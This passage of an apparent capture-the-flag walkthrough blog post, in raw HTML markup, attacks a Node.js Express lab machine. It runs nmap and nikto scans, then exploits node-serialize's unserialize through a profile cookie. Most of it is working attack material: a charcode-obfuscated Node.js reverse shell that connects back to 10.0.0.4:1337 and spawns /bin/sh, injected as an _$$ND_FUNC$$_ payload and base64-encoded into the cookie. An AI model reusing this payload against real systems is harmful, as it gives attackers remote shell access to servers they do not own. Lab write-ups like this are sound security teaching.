Completed ARP Ping Scan at 11:17, 0.03s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 11:17
Completed Parallel DNS resolution of 1 host. at 11:17, 0.00s elapsed
Initiating SYN Stealth Scan at 11:17
Scanning 10.0.0.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
Discovered open port 22/tcp on 10.0.0.5
Discovered open port 666/tcp on 10.0.0.5
Completed SYN Stealth Scan at 11:17, 0.12s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 11:17
Scanning 2 services on 10.0.0.5
Completed Service scan at 11:17, 11.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.0.5&lt;/span&gt;
NSE: Script scanning 10.0.0.5.
Initiating NSE at 11:17
Completed NSE at 11:17, 1.18s elapsed
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.5
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00062s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
666/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:BB:24:1C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 34.945 days (since Wed Jun  6 12:36:17 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms 10.0.0.5

NSE: Script Post-scanning.
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Initiating NSE at 11:17
Completed NSE at 11:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;At the start I decided to check out port &lt;code class=&quot;highlighter-rouge&quot;&gt;666&lt;/code&gt; running &lt;code class=&quot;highlighter-rouge&quot;&gt;NodeJS Express&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# curl 10.0.0.5:666
Under Construction, Come Back Later!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As the content of the website doesn’t tell us much, I decided to run &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; scan in the background.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.0.5:666
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          10.0.0.5
+ Target Hostname:    10.0.0.5
+ Target Port:        666
+ Start Time:         2018-07-11 11:19:05 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/24 0xxWt5IUP3GfGbHraPgY5EGPpcNzA 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Allowed HTTP Methods: GET, HEAD 
+ ERROR: Error limit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reached &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 6 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2018-07-11 11:19:35 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;30 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In the meantime, while manually looking around at the webiste, I’ve noticed that at the second visit we get different content. In burpsuite we can also notice a profile cookie.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;GET / HTTP/1.1
Host: 10.0.0.5:666
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0%3D
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1155
Date: Wed, 11 Jul 2018 15:21:14 GMT
Connection: close

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;SyntaxError: Unexpected token F in JSON at position 79&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at JSON.parse (&lt;span class=&quot;ni&quot;&gt;&amp;amp;lt;&lt;/span&gt;anonymous&lt;span class=&quot;ni&quot;&gt;&amp;amp;gt;&lt;/span&gt;)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at /home/nodeadmin/.web/server.js:12:29&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt; &lt;span class=&quot;ni&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As the cookie is &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoded let’s decode it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;csrftoken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Expires=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Friday&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Oct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2018&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;GMT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In addition we get the &lt;code class=&quot;highlighter-rouge&quot;&gt;unexpected token&lt;/code&gt; error,  let’s fix it by adding quotation marks at the start of the date.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;csrftoken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Expires=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Friday, 13 Oct 2018 00:00:00 GMT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Sending it with repeater in BurpSuite, we immediately  notice that the content of the website is correctly rendered.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;GET / HTTP/1.1
Host: 10.0.0.5:666
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOiJGcmlkYXksIDEzIE9jdCAyMDE4IDAwOjAwOjAwIEdNVCJ9
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 11
ETag: W/&quot;b-GWZKb4joaEb2aqpBlbdbhMNzgtI&quot;
Date: Wed, 11 Jul 2018 15:23:09 GMT
Connection: close

Hello Admin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But this brings another attack vector that I remember from another machine - bug in &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; function in NodeJS leading to remote code execution. You can read more &lt;a href=&quot;https://blog.websecurify.com/2017/02/hacking-node-serialize.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Firstly, let’s create a reverse shell using this &lt;a href=&quot;https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py&quot;&gt;nodejsshell.py&lt;/a&gt; with our IP and port to connect.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# python js-reverseshell.py 10.0.0.4 1337
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] LHOST &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10.0.0.4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] LPORT &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1337
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Encoding
&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;String.fromCharCode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,48,46,48,46,52,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we’re ready to add it into the cookie.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;csrftoken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Expires=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Friday, 13 Oct 2018 00:00:00 GMT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rce&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,48,46,48,46,52,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now it’s just a matter of encoding it with &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; and sending back with repeater. Don’t forget to set up a listener!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;GET / HTTP/1.1
Host: 10.0.0.5:666
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOiJGcmlkYXksIDEzIE9jdCAyMDE4IDAwOjAwOjAwIEdNVCIsICJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNDgsNDYsNDgsNDYsNDgsNDYsNTIsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTEsNTEsNTUsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTE